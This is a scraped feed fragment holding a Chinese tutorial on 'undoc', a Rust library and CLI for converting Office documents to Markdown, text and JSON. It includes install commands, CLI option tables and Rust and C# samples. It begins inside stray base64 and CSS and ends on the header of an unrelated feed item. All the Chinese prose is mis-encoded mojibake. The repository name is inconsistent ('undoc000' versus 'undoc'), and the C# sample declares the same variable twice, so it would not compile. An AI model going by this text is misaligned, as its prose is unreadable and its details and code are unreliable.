tv/p8QU1VPIM3knNDynctnBRfsEYhgSlNCIGgQv2UCkvGIHZgteMh1nBW9W4F16RAM6yDVV7amZTaYQcr59cuuhhWRTWBvAMLxQGeyFSHOLnh0MvUskz5RF+fbRYDEy0mZgqQYUHOLhr//b6rGoqeaLqQG0pw3PrBbyA+4EQUkRmhvgqNUfICUipKK4OKUqIJVPKB0jpEhjmWWp64jdbKmVZZNYogcJm493gsifOqhDyeh9GYR/FM7sW+DA5CKR0MSK3tvKZkpwB5gRE4tjFEr7RL0iWBGV51vHFCyupNGWWPqLgnoer9mtyEGSJAzwLllDTGzyznDjRN/CwOFkoFb4bm0eVIXICgpvdGoEvrF7fC89zfLkkeV5HbOhWiTwTpKYvCAJLGshRdXtKMKAWlyxq+MPQLk1h66g5RE5ABJYNFrqY3wvJklJRUKg5ZWLFXIA86yek2uDOPkBNb3CM5Pf7DL2QyIrUGiLH+xC5Bmmm/ARnHUhC6PnzxWDK0RH5HuIjZGy27erU9AZ0dTIWXyG+NpBBrSFySxZw220IqeUPFoS6jVAPNadM7yDsgNB1qOkLuAziMYIb1PQGA75wIaKGPyAb+9oF16g5RE5ALIQ+tSyLWoWDEAK6aXW3JlK9VJoyx1oyvVkNdvo5KXXDAVkdnaKmNwx0xjH98w3JNmTCm+Bc9hKVhsgJSI9pvp9Vdd++jmq6AXB2/HHrhcs5aTkVDv0DFzoHvKdq/mQsKX/4t7KJLDpOJW+IbAvMGoMkxfwAWZB8DT7W1diTE+WcgKz6pK1bs6z3daPwmJDsSKt6ZsCyjlLJMz0DsDGZ8SdlDROBjOb8YeWOjptU8kTXusuaazu7oJrfEnQvdkpVcUn6PTVHyAkIIW7br/Unklni0EJIZ1WgGsauZR+fvUglz6zY0dGfVp09ybRNlfwgi3k8YSbvJJ29VMoLt9v6rZVQL7hOYUubndHJGclBtzn1byqNMCogi09/2nFb01/oj+f/5TyjauBOKtPcZ1r7qZQ3f2lRfxZPWi2anp8TSDAGExZMa2jr8u03L1M5L7q3Xc+iAeuHRl/ScvPcjSLDBnZS/cjtNHd2v3171Ewbs9N5q7Pn4otVMx3btBsCsoRbk1FxG5dMVgMDqfTpXl1/tuFMa5zKefPROdX59qLQBwLnNog8Wy1OcjB1N+QEsW/QsFNZuO35Xb1v98QLX4/Sx+O3wqujrQ6013ABUWI8+AaqBjAH01+ghL22+5X2PirnMG7r+esbnae/V1neauvGSoHjigTcVU7UGFm2DeK4ttxKpQ+mLPvl+o/PjnkAkw9HTqSMmVHhyAMx9iFcSh/BHTfLceO/C8mKjApBf9zszGhoY92m9sN+BGOY9AeD7eGniv8OTaOB4dgyTsQd9wS+IQu4lciYdkI7CLrNH3Rvbb9FL41i0tbzVP2iWJkobpN5fmM4IJfJskTP1Bk8A9HQmbpmGDBrWqdVCN/Yd7PjxKGOXn+bmbto3feVVcVB9qehIL8EJy8nChwgr0O2xxBnhGU5eP2CfYbl/m4gBRsbtneMORP9oGpjpcCsiKzHHfdOPiQ/wMniyFEu2dbiTQCAeN/vavC466BGYLttXc9fmXBXMGlAhiHHur+sq6uPiUI9z7CVHMPwBnLSuuN8FuC48/Oaz1ylt94XfrW5ouyprwWfYRkwNyCyYYjwkBHows1fa+tV/fzGxlv39b9gqvfPmQ+i/HK8KlcBjhHwfl8HEHyOd1JnuzZd66S3TTPNNNP8/wDAfwDG7G0m9LKBpwAAAABJRU5ErkJggg==) 10px 10px no-repeat;background-color:#212122;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);background-size:40px}.markdown-body pre&gt;code{font-size:14px;padding:16px 8px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#fff;background:#272822}.markdown-body pre&gt;code::-webkit-scrollbar{height:10px;background-color:#f5f5f5}.markdown-body pre&gt;code::-webkit-scrollbar-track{box-shadow:inset 0 0 6px rgba(0,0,0,.3);border-radius:3px;background-color:#f5f5f5}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{border-radius:3px;box-shadow:inset 0 0 6px rgba(0,0,0,.3);background-color:#555}.markdown-body a{color:#ef7060;padding:2px;text-decoration:none;border-bottom:.125em solid #ef7060;border-radius:2px;box-shadow:inset 0 -.025em 0 #ef7060;transition:box-shadow .27s cubic-bezier(.77,0,.175,1),color .27s cubic-bezier(.77,0,.175,1)}.markdown-body a:focus,.markdown-body a:hover{outline:none;box-shadow:inset 0 -1.5em 0 #ef7060;color:#fff}.markdown-body a:before{content:"â‡² ";vertical-align:top;margin-left:2px;font-family:dart!important;font-size:12px;color:inherit;opacity:.7}.markdown-body table{background:#fbfbfb;border-radius:4px;border-collapse:collapse;margin:auto;padding:5px;width:95%;box-shadow:0 5px 10px rgba(0,0,0,.1);animation:float 5s infinite}.markdown-body table th{color:#fff;background:#212122;border-bottom:1px solid #9ea7af;border-right:1px solid #343a45;font-size:18px;padding:16px;text-align:left;vertical-align:middle}.markdown-body table th:first-child{border-top-left-radius:4px}.markdown-body table th:last-child{border-top-right-radius:4px;border-right:none}.markdown-body table tr{border-top:1px solid #c1c3d1;border-bottom:1px solid #c1c3d1;color:#666b85}.markdown-body table tr:hover td{background:#212122;color:#fff;border-top:1px solid #22262e}.markdown-body table tr:first-child{border-top:none}.markdown-body table tr:last-child{border-bottom:none}.markdown-body table tr:nth-child(odd) td{background:#f1f1f1}.markdown-body table tr:nth-child(odd):hover td{background:#212122}.markdown-body table tr:last-child td:first-child{border-bottom-left-radius:4px}.markdown-body table tr:last-child td:last-child{border-bottom-right-radius:4px}.markdown-body table td{background:#fbfbfb;padding:16px;text-align:left;vertical-align:middle;font-size:16px;border-right:1px solid #c1c3d1}.markdown-body table td:last-child{border-right:0}.markdown-body blockquote{color:#777;padding:1px 16px;margin:24px 0;border-left:4px solid #c6c4c4;background-color:#f1f1f1;transition:all .3s ease-out;border-radius:4px}.markdown-body blockquote:hover{border-left-color:#212122;background-color:#212122;color:#fff}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:24px}.markdown-body ol li,.markdown-body ul li{margin-bottom:6px;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body span.math{margin-left:32px;font-size:18px;font-weight:700}@media (max-width:720px){.markdown-body h1{font-size:30.4px}.markdown-body h2{font-size:24px}.markdown-body h3{font-size:19.2px}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:12.8px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">ä¸€ã€å·¥å…·åŸºç¡€ä¿¡æ¯</h2>
<ol>
<li><strong>å®šä½</strong>ï¼šä¸€æ¬¾é«˜æ€§èƒ½ Rust åº“ï¼Œä¸»æ‰“ Microsoft Office æ–‡æ¡£ï¼ˆDOCXã€XLSXã€PPTXï¼‰å†…å®¹æå–ï¼Œæ”¯æŒè½¬æ¢ä¸ºå¤šç§æ ¼å¼ã€‚</li>
<li><strong>ç‰ˆæœ¬ä¸æ›´æ–°</strong>ï¼šå½“å‰ç‰ˆæœ¬ 0.1.10ï¼Œ2025 å¹´ 12 æœˆ 21 æ—¥å‘å¸ƒï¼›å†å²ç‰ˆæœ¬ä» 0.1.1 åˆ° 0.1.9ï¼Œå¤šé›†ä¸­åœ¨ 2025 å¹´ 12 æœˆ 20-21 æ—¥æ›´æ–°ï¼Œä¸”è‡ªå¸¦é€šè¿‡ GitHub Releases å®ç°çš„è‡ªæ›´æ–°æœºåˆ¶ï¼ˆå¯æ£€æŸ¥æ›´æ–°ã€æ›´æ–°åˆ°æœ€æ–°ç‰ˆã€å¼ºåˆ¶é‡è£…ï¼‰ã€‚</li>
<li><strong>æ–‡æ¡£è¦†ç›–ä¸è§„æ¨¡</strong>ï¼šæ–‡æ¡£è¦†ç›–ç‡ 91.49%ï¼ˆ235 ä¸ªé¡¹ç›®ä¸­ 215 ä¸ªæœ‰æ–‡æ¡£ï¼Œ38 ä¸ªé¡¹ç›®ä¸­ 14 ä¸ªå¸¦ç¤ºä¾‹ï¼‰ï¼›æºç å¤§å° 368.97 kBï¼Œæ–‡æ¡£å¤§å° 3.9 MBã€‚</li>
<li><strong>ä¾èµ–é¡¹</strong>ï¼šåŒ…å« quick-xmlï¼ˆ^0.37ï¼‰ã€rayonï¼ˆ^1.10ï¼‰ã€regexï¼ˆ^1.11ï¼‰ã€serdeï¼ˆ^1.0ï¼‰ã€serde_jsonï¼ˆ^1.0ï¼‰ã€thiserrorï¼ˆ^2.0ï¼‰ã€tokioï¼ˆ^1.42ï¼Œå¯é€‰ï¼‰ã€unicode-normalizationï¼ˆ^0.1ï¼‰ã€zipï¼ˆ^2.2ï¼‰ã€tempfileï¼ˆ^3.14ï¼‰ç­‰ã€‚</li>
<li><strong>æ‰€æœ‰æƒ</strong>ï¼šç”± iyulab-caveman ç»´æŠ¤ï¼Œä»“åº“åœ°å€ä¸º iyulab/undoc000ï¼Œå¯åœ¨ crates.io è·å–ã€‚</li>
</ol>
<h2 data-id="heading-1">äºŒã€æ ¸å¿ƒåŠŸèƒ½ç‰¹æ€§</h2>
<ol>
<li>
<p><strong>æ ¼å¼æ”¯æŒ</strong></p>
<ul>
<li><strong>è¾“å…¥æ ¼å¼</strong>ï¼šDOCXï¼ˆWordï¼‰ã€XLSXï¼ˆExcelï¼‰ã€PPTXï¼ˆPowerPointï¼‰ï¼Œå‡å·²å®ç°å®Œæ•´æ”¯æŒã€‚</li>
<li><strong>è¾“å‡ºæ ¼å¼</strong>ï¼šMarkdownï¼ˆå¸¦ç»“æ„åŒ–æ’ç‰ˆï¼Œå«æ ‡é¢˜ã€åˆ—è¡¨ã€è¡¨æ ¼ç­‰ï¼‰ã€Plain Textï¼ˆçº¯æ–‡æœ¬ï¼Œæ— æ ¼å¼æ ‡è®°ï¼‰ã€JSONï¼ˆå«å®Œæ•´å…ƒæ•°æ®ï¼Œå¦‚æ ‡é¢˜ã€ä½œè€…ã€åˆ›å»ºæ—¶é—´ç­‰ï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>å†…å®¹å¤„ç†èƒ½åŠ›</strong></p>
<ul>
<li>ä¿ç•™æ–‡æ¡£ç»“æ„ï¼šåŒ…æ‹¬æ ‡é¢˜å±‚çº§ã€åˆ—è¡¨ï¼ˆæœ‰åº / æ— åºåŠåµŒå¥—ï¼‰ã€è¡¨æ ¼ã€è¡Œå†…æ ¼å¼ï¼ˆç²—ä½“ã€æ–œä½“ã€ä¸‹åˆ’çº¿ã€åˆ é™¤çº¿ï¼‰ã€‚</li>
<li>ä¸“é¡¹åŠŸèƒ½ï¼šPPTX è¡¨æ ¼å®Œæ•´è§£æã€CJK æ–‡æœ¬æ™ºèƒ½é—´è·ï¼ˆæ”¯æŒä¸­éŸ©æ—¥å†…å®¹ï¼‰ã€èµ„æºæå–ï¼ˆå›¾ç‰‡ã€å›¾è¡¨ã€åµŒå…¥å¼åª’ä½“ï¼‰ã€æ–‡æœ¬æ¸…ç†ï¼ˆå¤šé¢„è®¾ï¼Œé€‚é… LLM è®­ç»ƒæ•°æ®å‡†å¤‡ï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>æŠ€æœ¯ä¼˜åŠ¿</strong>ï¼šåŸºäº Rayon å®ç°å¹¶è¡Œå¤„ç†ï¼ˆå¤šç« èŠ‚ / å·¥ä½œè¡¨ / å¹»ç¯ç‰‡ï¼‰ã€é€šè¿‡ quick-xml å®ç°é«˜æ•ˆ XML è§£æã€æ”¯æŒå¤§æ–‡æ¡£å†…å­˜é«˜æ•ˆå¤„ç†ï¼Œè¿˜æä¾› C-ABI FFIï¼ˆå¯ä½œä¸º C#ã€Python ç­‰è¯­è¨€çš„åŸç”Ÿåº“ï¼‰ã€‚</p>
</li>
</ol>
<h2 data-id="heading-2">ä¸‰ã€å®‰è£…æ–¹å¼</h2>
<h3 data-id="heading-3">ï¼ˆä¸€ï¼‰é¢„ç¼–è¯‘äºŒè¿›åˆ¶åŒ…ï¼ˆæ¨èï¼‰</h3>






























<table><thead><tr><th>å¹³å°</th><th>æ¶æ„</th><th>ä¸‹è½½ä¸å®‰è£…å‘½ä»¤</th></tr></thead><tbody><tr><td>Windows</td><td>x64</td><td>1. ä¸‹è½½ï¼š<code>Invoke-WebRequest -Uri "https://github.com/iyulab/undoc/releases/latest/download/undoc-cli-x86_64-pc-windows-msvc.zip" -OutFile "undoc.zip"</code>2. è§£å‹ï¼š<code>Expand-Archive -Path "undoc.zip" -DestinationPath "."</code>3. ï¼ˆå¯é€‰ï¼‰ç§»åŠ¨åˆ° PATH ç›®å½•ï¼š<code>Move-Item -Path "undoc.exe" -Destination "$env:LOCALAPPDATA\Microsoft\WindowsApps"</code>4. éªŒè¯ï¼š<code>undoc version</code></td></tr><tr><td>Linux</td><td>x64</td><td>1. ä¸‹è½½ï¼š<code>curl -LO https://github.com/iyulab/undoc/releases/latest/download/undoc-cli-x86_64-unknown-linux-gnu.tar.gz</code>2. è§£å‹ï¼š<code>tar -xzf undoc-cli-x86_64-unknown-linux-gnu.tar.gz</code>3. å®‰è£…ï¼š<code>sudo mv undoc /usr/local/bin/</code>ï¼ˆç³»ç»Ÿçº§ï¼‰æˆ–<code>mkdir -p ~/.local/bin &amp;&amp; mv undoc ~/.local/bin/ &amp;&amp; echo 'export PATH="$HOME/.local/bin:$PATH"' &gt;&gt; ~/.bashrc &amp;&amp; source ~/.bashrc</code>ï¼ˆç”¨æˆ·çº§ï¼‰4. éªŒè¯ï¼š<code>undoc version</code></td></tr><tr><td>macOS</td><td>Intel</td><td>1. ä¸‹è½½ï¼š<code>curl -LO https://github.com/iyulab/undoc/releases/latest/download/undoc-cli-x86_64-apple-darwin.tar.gz</code>2. è§£å‹ï¼š<code>tar -xzf undoc-cli-x86_64-apple-darwin.tar.gz</code>3. å®‰è£…ï¼š<code>sudo mv undoc /usr/local/bin/</code>4. éªŒè¯ï¼š<code>undoc version</code></td></tr><tr><td>macOS</td><td>Apple Siliconï¼ˆM1/M2/M3ï¼‰</td><td>1. ä¸‹è½½ï¼š<code>curl -LO https://github.com/iyulab/undoc/releases/latest/download/undoc-cli-aarch64-apple-darwin.tar.gz</code>2. è§£å‹ï¼š<code>tar -xzf undoc-cli-aarch64-apple-darwin.tar.gz</code>3. å®‰è£…ï¼š<code>sudo mv undoc /usr/local/bin/</code>4. éªŒè¯ï¼š<code>undoc version</code></td></tr></tbody></table>
<h3 data-id="heading-4">ï¼ˆäºŒï¼‰Cargo å®‰è£…ï¼ˆéœ€å·²å®‰è£… Rustï¼‰</h3>
<ul>
<li>å®‰è£… CLIï¼š<code>cargo install undoc-cli</code></li>
<li>é¡¹ç›®æ·»åŠ åº“ä¾èµ–ï¼š<code>cargo add undoc</code></li>
</ul>
<h2 data-id="heading-5">å››ã€ä½¿ç”¨æŒ‡å—</h2>
<h3 data-id="heading-6">ï¼ˆä¸€ï¼‰CLI å‘½ä»¤ä½¿ç”¨</h3>
<ol>
<li>
<p><strong>æ ¸å¿ƒå‘½ä»¤</strong></p>























































<table><thead><tr><th>å‘½ä»¤</th><th>åŠŸèƒ½</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td><code>undoc &lt;file&gt; [output]</code></td><td>æå–æ‰€æœ‰æ ¼å¼ï¼ˆMarkdownã€æ–‡æœ¬ã€JSONï¼‰+ åª’ä½“åˆ°è¾“å‡ºç›®å½•ï¼ˆé»˜è®¤å‘½ä»¤ï¼‰</td><td><code>undoc document.docx ./output</code></td></tr><tr><td><code>undoc convert &lt;file&gt; [OPTIONS]</code></td><td>åŒé»˜è®¤å‘½ä»¤ï¼Œæ˜¾å¼æŒ‡å®šè½¬æ¢</td><td>-</td></tr><tr><td><code>undoc markdown/&lt;file&gt; [OPTIONS]</code>ï¼ˆåˆ«å<code>md</code>ï¼‰</td><td>ä»…è½¬æ¢ä¸º Markdown</td><td><code>undoc md document.docx --frontmatter -o report.md</code>ï¼ˆå¸¦ YAML å‰ç«¯ matterï¼‰</td></tr><tr><td><code>undoc text &lt;file&gt; [OPTIONS]</code></td><td>ä»…è½¬æ¢ä¸ºçº¯æ–‡æœ¬</td><td><code>undoc text document.docx --cleanup standard -o output.txt</code>ï¼ˆå¸¦æ–‡æœ¬æ¸…ç†ï¼‰</td></tr><tr><td><code>undoc json &lt;file&gt; [OPTIONS]</code></td><td>ä»…è½¬æ¢ä¸º JSON</td><td><code>undoc json document.docx --compact -o output.json</code>ï¼ˆç´§å‡‘ JSON æ ¼å¼ï¼‰</td></tr><tr><td><code>undoc info &lt;file&gt;</code></td><td>æ˜¾ç¤ºæ–‡æ¡£ä¿¡æ¯ï¼ˆæ ¼å¼ã€ç« èŠ‚æ•°ã€èµ„æºæ•°ã€æ ‡é¢˜ã€ä½œè€…ç­‰ï¼‰</td><td><code>undoc info document.docx</code></td></tr><tr><td><code>undoc extract &lt;file&gt; [OPTIONS]</code></td><td>ä»…æå–èµ„æºï¼ˆå›¾ç‰‡ç­‰ï¼‰</td><td><code>undoc extract presentation.pptx -o ./media</code></td></tr><tr><td><code>undoc update [OPTIONS]</code></td><td>è‡ªæ›´æ–°</td><td><code>undoc update --check</code>ï¼ˆæ£€æŸ¥æ›´æ–°ï¼‰</td></tr><tr><td><code>undoc version</code></td><td>æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯</td><td>-</td></tr></tbody></table>
</li>
<li>
<p><strong>Markdown è½¬æ¢å…³é”®é€‰é¡¹</strong></p>



































<table><thead><tr><th>é€‰é¡¹</th><th>æè¿°</th><th>é»˜è®¤å€¼</th></tr></thead><tbody><tr><td><code>-o, --output</code></td><td>è¾“å‡ºæ–‡ä»¶è·¯å¾„</td><td>stdoutï¼ˆæ ‡å‡†è¾“å‡ºï¼‰</td></tr><tr><td><code>-f, --frontmatter</code></td><td>åŒ…å« YAML å‰ç«¯ matter</td><td>false</td></tr><tr><td><code>--table-mode</code></td><td>è¡¨æ ¼æ¸²æŸ“æ¨¡å¼ï¼ˆ<code>markdown</code>/<code>html</code>/<code>ascii</code>ï¼‰</td><td>markdown</td></tr><tr><td><code>--cleanup</code></td><td>æ–‡æœ¬æ¸…ç†é¢„è®¾ï¼ˆ<code>minimal</code>/<code>standard</code>/<code>aggressive</code>ï¼‰</td><td>none</td></tr><tr><td><code>--max-heading</code></td><td>æœ€å¤§æ ‡é¢˜å±‚çº§ï¼ˆ1-6ï¼‰</td><td>6</td></tr></tbody></table>
</li>
<li>
<p><strong>æ‰¹é‡è½¬æ¢ç¤ºä¾‹</strong></p>
<ul>
<li>Shellï¼š<code>for f in *.docx; do undoc md "$f" -o "${f%.docx}.md"; done</code></li>
<li>PowerShellï¼š<code>Get-ChildItem *.docx | ForEach-Object { undoc md $_.FullName -o "$($_.BaseName).md" }</code></li>
</ul>
</li>
</ol>
<h3 data-id="heading-7">ï¼ˆäºŒï¼‰Rust åº“ä½¿ç”¨</h3>
<ol>
<li><strong>å¿«é€Ÿå¼€å§‹</strong></li>
</ol>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> undoc::{parse_file, render};
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() <span class="hljs-punctuation">-&gt;</span> undoc::<span class="hljs-type">Result</span>&lt;()&gt; {
    <span class="hljs-comment">// è§£ææ–‡æ¡£</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">doc</span> = <span class="hljs-title function_ invoke__">parse_file</span>(<span class="hljs-string">"document.docx"</span>)?;
    <span class="hljs-comment">// è½¬æ¢ä¸ºMarkdown</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">options</span> = render::RenderOptions::<span class="hljs-title function_ invoke__">default</span>();
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">markdown</span> = render::<span class="hljs-title function_ invoke__">to_markdown</span>(&amp;doc, &amp;options)?;
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}"</span>, markdown);
    <span class="hljs-comment">// è·å–çº¯æ–‡æœ¬</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">text</span> = render::<span class="hljs-title function_ invoke__">to_text</span>(&amp;doc, &amp;options)?;
    <span class="hljs-comment">// è·å–JSON</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">json</span> = render::<span class="hljs-title function_ invoke__">to_json</span>(&amp;doc, render::JsonFormat::Pretty)?;
    <span class="hljs-title function_ invoke__">Ok</span>(())
}
</code></pre>
<ol start="2">
<li><strong>è‡ªå®šä¹‰æ¸²æŸ“é€‰é¡¹</strong></li>
</ol>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> undoc::render::{RenderOptions, CleanupPreset, TableFallback};
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">options</span> = RenderOptions::<span class="hljs-title function_ invoke__">new</span>()
    .<span class="hljs-title function_ invoke__">with_frontmatter</span>(<span class="hljs-literal">true</span>) <span class="hljs-comment">// å¸¦YAMLå‰ç«¯matter</span>
    .<span class="hljs-title function_ invoke__">with_table_fallback</span>(TableFallback::Html) <span class="hljs-comment">// è¡¨æ ¼ fallback ä¸ºHTML</span>
    .<span class="hljs-title function_ invoke__">with_cleanup_preset</span>(CleanupPreset::Aggressive) <span class="hljs-comment">// æ¿€è¿›æ–‡æœ¬æ¸…ç†</span>
    .<span class="hljs-title function_ invoke__">with_max_heading</span>(<span class="hljs-number">3</span>); <span class="hljs-comment">// æœ€å¤§æ ‡é¢˜å±‚çº§3</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">markdown</span> = render::<span class="hljs-title function_ invoke__">to_markdown</span>(&amp;doc, &amp;options)?;
</code></pre>
<ol start="3">
<li><strong>æ–‡æ¡£ç»“æ„æ“ä½œ</strong>ï¼šå¯è®¿é—®å…ƒæ•°æ®ï¼ˆæ ‡é¢˜ã€ä½œè€…ã€åˆ›å»ºæ—¶é—´ï¼‰ã€è¿­ä»£ç« èŠ‚ä¸å…ƒç´ ã€æå–èµ„æºæ–‡ä»¶ã€‚</li>
<li><strong>æ ¼å¼æ£€æµ‹</strong>ï¼šæ”¯æŒä»æ–‡ä»¶è·¯å¾„ï¼ˆ<code>detect_format_from_path</code>ï¼‰æˆ–å­—èŠ‚æ•°ç»„ï¼ˆ<code>detect_format_from_bytes</code>ï¼‰æ£€æµ‹æ–‡æ¡£æ ¼å¼ã€‚</li>
</ol>
<h3 data-id="heading-8">ï¼ˆä¸‰ï¼‰C# /.NET é›†æˆ</h3>
<ol>
<li><strong>è·å–åŸç”Ÿåº“</strong>ï¼šä» GitHub Releases ä¸‹è½½ï¼ˆWindows x64 ä¸º<code>undoc.dll</code>ã€Linux x64 ä¸º<code>libundoc.so</code>ã€macOS ä¸º<code>libundoc.dylib</code>ï¼‰ï¼Œæˆ–é€šè¿‡<code>cargo build --release --features ffi</code>ä»æºç æ„å»ºã€‚</li>
<li><strong>C# åŒ…è£…å™¨ä½¿ç”¨</strong></li>
</ol>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">using</span> Undoc;
<span class="hljs-comment">// è§£æå¹¶è½¬æ¢ä¸ºMarkdown</span>
<span class="hljs-built_in">string</span> markdown = UndocNative.ToMarkdown(<span class="hljs-string">"document.docx"</span>);
<span class="hljs-comment">// è§£æå¹¶è½¬æ¢ä¸ºçº¯æ–‡æœ¬</span>
<span class="hljs-built_in">string</span> text = UndocNative.ToText(<span class="hljs-string">"document.docx"</span>);
<span class="hljs-comment">// è§£æå¹¶è½¬æ¢ä¸ºJSON</span>
<span class="hljs-built_in">string</span> json = UndocNative.ToJson(<span class="hljs-string">"document.docx"</span>);
<span class="hljs-comment">// ä»å­—èŠ‚æ•°ç»„è§£æ</span>
<span class="hljs-built_in">byte</span>[] data = File.ReadAllBytes(<span class="hljs-string">"document.docx"</span>);
<span class="hljs-built_in">string</span> markdown = UndocNative.ToMarkdownFromBytes(data);
</code></pre>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#![allow(warnings)]</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;(), <span class="hljs-type">Box</span>&lt;<span class="hljs-keyword">dyn</span> std::error::Error&gt;&gt; {
    <span class="hljs-keyword">use</span> undoc::{to_json, render::JsonFormat};
    <span class="hljs-keyword">use</span> undoc::{parse_file, to_markdown};

    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">path</span> = <span class="hljs-string">"E:/demo.xlsx"</span>;

    <span class="hljs-comment">// Simple text extraction</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">text</span> = undoc::<span class="hljs-title function_ invoke__">extract_text</span>(path)?;
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}"</span>, text);

    <span class="hljs-comment">// Convert to Markdown</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">markdown</span> = <span class="hljs-title function_ invoke__">to_markdown</span>(path)?;
    std::fs::<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-string">"output.md"</span>, markdown)?;


    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">json</span> = <span class="hljs-title function_ invoke__">to_json</span>(path, JsonFormat::Compact)?;
    std::fs::<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-string">"output.json"</span>, json)?;

    <span class="hljs-comment">// Full parsing with access to structure</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">doc</span> = <span class="hljs-title function_ invoke__">parse_file</span>(path)?;
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Sections: {}"</span>, doc.sections.<span class="hljs-title function_ invoke__">len</span>());
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Resources: {}"</span>, doc.resources.<span class="hljs-title function_ invoke__">len</span>());
    <span class="hljs-title function_ invoke__">Ok</span>(())
}

</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SpringCloudAlibaba]]></title>    <link>https://juejin.cn/post/7592483877986402310</link>    <guid>https://juejin.cn/post/7592483877986402310</guid>    <pubDate>2026-01-07T15:52:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592483877986402310" data-draft-id="7592159803411496996" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SpringCloudAlibaba"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-07T15:52:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ihgry"/> <meta itemprop="url" content="https://juejin.cn/user/3210229685954718"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SpringCloudAlibaba
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3210229685954718/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ihgry
